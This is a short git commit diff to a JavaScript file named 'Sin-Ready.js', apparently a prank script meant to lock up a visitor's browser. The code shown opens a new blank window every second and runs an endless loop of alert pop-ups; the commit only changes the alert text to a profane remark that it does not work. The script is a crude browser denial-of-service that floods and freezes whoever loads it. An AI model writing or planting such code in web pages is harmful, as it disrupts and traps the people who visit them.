b7a9c1f90091b24449ffa73fcc9c7720895c79b1
RupicXD <133695253+Rupicc@users.noreply.github.com>
2024-02-05 15:15:12 -0500

    one o

--- Sin-Ready.js
+++ Sin-Ready.js
@@ -3,6 +3,6 @@ setInterval(function() {
     window.open("about:blank", "_blank");
   }, 1000);
   while (true) {
-    alert("This alert will keep opening non-stop on Chrome!");
+    alert("This SHIT DONT WORK!");
   }
     
